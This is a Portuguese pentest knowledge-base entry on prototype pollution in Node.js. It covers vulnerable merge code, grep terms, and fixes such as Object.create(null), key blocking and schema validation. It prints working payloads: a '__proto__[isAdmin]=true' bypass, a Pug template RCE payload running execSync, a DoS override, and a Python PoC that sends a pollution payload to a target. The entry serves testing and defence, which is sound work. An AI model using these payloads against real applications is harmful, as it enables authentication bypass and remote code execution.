# Prototype Pollution

**Tags:** #alto #critico #prototype-pollution #nodejs #javascript #rce
**OWASP:** A08:2021  Software and Data Integrity Failures
**CVSS Base:** 7.5 (Alto)  9.8 (Crítico  via template engine RCE)

---

## 📖 O que é

Em JavaScript/Node.js, se um atacante controla a chave de um objeto e consegue inserir `__proto__` ou `constructor.prototype`, todos os objetos do processo herdam a propriedade poluída  podendo causar Auth Bypass, RCE via template engines, e DoS.

---

## 🔍 `grep_search` Táticas

```
deepMerge
extend(
_.merge
merge(
clone(
Object.assign(
JSON.parse(
__proto__
constructor.prototype
hasOwnProperty
Object.create(null)
lodash
merge-deep
jquery.extend
```

---

## 💣 Como Funciona

### Conceito Base

```javascript
// Todos os objetos herdam de Object.prototype
const obj = {};
console.log(obj.isAdmin);  // undefined (normal)

// Polluting Object.prototype
Object.prototype.isAdmin = true;

// Agora TODOS os objetos têm isAdmin = true!
console.log(obj.isAdmin);  // true  Auth bypass!
console.log({}.isAdmin);   // true  qualquer objeto novo já está "poluído"
```

---

### Vetores de Injeção

#### 1. Query String (`?__proto__[isAdmin]=true`)

```javascript
//  VULNERÁVEL  query string copiada para objeto sem sanitização
const qs = require('qs');
const query = qs.parse(req.query);  // "?__proto__[isAdmin]=true"

// ou
const query = Object.assign({}, req.query);
// query.__proto__.isAdmin = true  poluição!
```

#### 2. JSON Body com `__proto__`

```javascript
//  VULNERÁVEL  JSON.parse + merge profundo não sanitizado
function deepMerge(target, source) {
    for (const key in source) {
        if (typeof source[key] === 'object') {
            deepMerge(target[key], source[key]);  // itera __proto__!
        } else {
            target[key] = source[key];            // atribui a __proto__!
        }
    }
}

const body = JSON.parse('{"__proto__": {"isAdmin": true}}');
deepMerge({}, body);  //  Object.prototype.isAdmin = true!
```

#### 3. `_.merge` do Lodash (versões vulneráveis < 4.17.21)

```javascript
//  VULNERÁVEL  lodash < 4.17.21
const _ = require('lodash');
const userInput = {"__proto__": {"isAdmin": true}};
_.merge({}, userInput);  //  poluição global!
```

---

## 💣 Impactos por Categoria

### Auth Bypass

```javascript
// Código de verificação de permissão
function checkAdmin(user) {
    return user.isAdmin === true;
}

// Pós-poluição com __proto__[isAdmin]=true
const normalUser = {};  // sem propriedade isAdmin própria
checkAdmin(normalUser);  //  true! (herda de Object.prototype)
```

### RCE via Template Engines

```javascript
// Poluição + renderização com Handlebars/Pug/EJS usa Object.prototype como contexto
Object.prototype.outputFunctionName = "process.mainModule.require('child_process').execSync('id').toString()";

// Quando Pug renderiza qualquer template:
const html = pug.render('p= name', { name: 'test' });
//  executa o payload como parte do contexto de render  RCE!
```

### DoS por Quebra de Operações Nativas

```javascript
Object.prototype.toString = () => { throw new Error("DOS"); };

// Agora qualquer toString() em qualquer objeto quebra
[].toString();  // throw Error  crash
```

---

## 🧪 PoC de Detecção

```python
# .tmp/validate_proto_pollution.py
import requests, json

TARGET = "http://target.com"
ENDPOINT = "/api/merge"  # endpoint que aceita merge de objetos

# Payload de poluição
PAYLOAD = json.dumps({"__proto__": {"polluted": "YES_POLLUTED"}})

r = requests.post(f"{TARGET}{ENDPOINT}", data=PAYLOAD,
                  headers={"Content-Type": "application/json"}, timeout=10)
print(f"POST status: {r.status_code}")

# Verificar se a poluição propaga para outra resposta
check = requests.get(f"{TARGET}/api/status", timeout=10)
if "polluted" in check.text.lower() or "YES_POLLUTED" in check.text:
    print("[VULN] Prototype Pollution confirmada  propriedade poluída visível globalmente!")
else:
    print("[OK ou não detectável via resposta]  verificar comportamento de auth")
```

---

## 🛡️ Correção

### 1. `Object.create(null)` para objetos de cache/store

```javascript
//  CORRETO  objeto sem prototype (não herda de Object)
const cache = Object.create(null);
cache['__proto__'] = 'safe';  // é apenas uma propriedade, não prototype

// Usando Map em vez de objeto literal para stores
const store = new Map();
store.set('key', 'value');
store.has('__proto__');  // false  Map não tem prototype como key
```

### 2. `hasOwnProperty` antes de iterar

```javascript
//  CORRETO  validar que a chave é própria do objeto
function safeMerge(target, source) {
    for (const key in source) {
        if (Object.prototype.hasOwnProperty.call(source, key)) {
            // Bloquear explicitamente __proto__ e constructor
            if (key === '__proto__' || key === 'constructor' || key === 'prototype') {
                continue;
            }
            if (typeof source[key] === 'object' && source[key] !== null) {
                target[key] = target[key] || {};
                safeMerge(target[key], source[key]);
            } else {
                target[key] = source[key];
            }
        }
    }
    return target;
}
```

### 3. Atualizar Lodash (versão 4.17.21+)

```bash
npm update lodash
npm install lodash@latest
```

### 4. JSON Schema Validation

```javascript
//  CORRETO  validar estrutura antes de merges
const Ajv = require('ajv');
const ajv = new Ajv();

const schema = {
    type: 'object',
    additionalProperties: false,  // rejeitar chaves não declaradas
    properties: {
        name: { type: 'string' },
        age: { type: 'number' },
    }
};

const validate = ajv.compile(schema);
if (!validate(userInput)) {
    throw new Error('Input inválido');
}
```

---

## 🔗 Chain Exploits

```
Prototype Pollution via query string  isAdmin=true  Admin bypass sem login
Prototype Pollution + Pug/Handlebars/EJS  RCE via template render
Prototype Pollution + Express middleware  Qualquer check de propriedade bypassa
Prototype Pollution (DoS)  crashar processo Node.js  Denial of Service
Prototype Pollution + lodash < 4.17.21  vulnerabilidade de supply chain
```

---

## 📌 Referências
- [[analise-de-dependencias-por-cve]]
- [[nosql-injection]]
- [[ssti-server-side-template-injection]]
- [Prototype Pollution Research  Portswigger](https://portswigger.net/research/server-side-prototype-pollution)
- [HackTricks Prototype Pollution](https://book.hacktricks.xyz/pentesting-web/deserialization/nodejs-proto-prototype-pollution)
